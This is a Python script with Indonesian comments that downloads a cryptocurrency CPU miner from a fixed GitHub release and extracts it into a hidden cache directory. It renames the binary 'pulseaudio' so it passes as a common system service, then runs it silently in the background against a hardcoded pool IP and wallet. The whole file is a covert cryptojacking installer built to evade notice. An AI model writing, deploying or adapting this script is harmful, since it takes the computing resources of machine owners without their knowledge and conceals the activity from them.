#!/usr/bin/env python3

import subprocess
import os
import shutil
import tarfile
import urllib.request
import time

# Konfigurasi
WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzo"
POOL = "stratum+tcp://104.248.150.108:9933"
ALGO = "power2b"
URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
FILENAME = ".cpuminer-hidden.tar.gz"
EXTRACTED_BIN = "cpuminer-sse2"
RENAMED_BIN = "pulseaudio"  # menyamar sebagai service umum
HIDDEN_DIR = os.path.expanduser("~/.cache/.a/")
BIN_PATH = os.path.join(HIDDEN_DIR, RENAMED_BIN)

def check_dependencies():
    for cmd in ["wget", "tar", "chmod"]:
        if shutil.which(cmd) is None:
            print(f"[!] '{cmd}' tidak tersedia. Install dulu.")
            exit(1)

def anti_suspend():
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        pass

def download_and_extract():
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    tar_path = os.path.join(HIDDEN_DIR, FILENAME)

    if not os.path.exists(tar_path):
        print("[*] Mengunduh miner...")
        urllib.request.urlretrieve(URL, tar_path)

    print("[*] Mengekstrak ke lokasi tersembunyi...")
    with tarfile.open(tar_path, "r:gz") as tar:
        tar.extractall(path=HIDDEN_DIR, filter="data")

    real_bin = os.path.join(HIDDEN_DIR, EXTRACTED_BIN)
    if os.path.exists(real_bin):
        os.rename(real_bin, BIN_PATH)
        os.chmod(BIN_PATH, 0o755)

def run_miner():
    print("[*] Menjalankan di background sebagai 'pulseaudio'...")
    cmd = ["nice", "-n", "15", BIN_PATH, "-a", ALGO, "-o", POOL, "-u", WALLET, "--no-color"]
    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

if __name__ == "__main__":
    check_dependencies()
    download_and_extract()
    run_miner()
    anti_suspend()
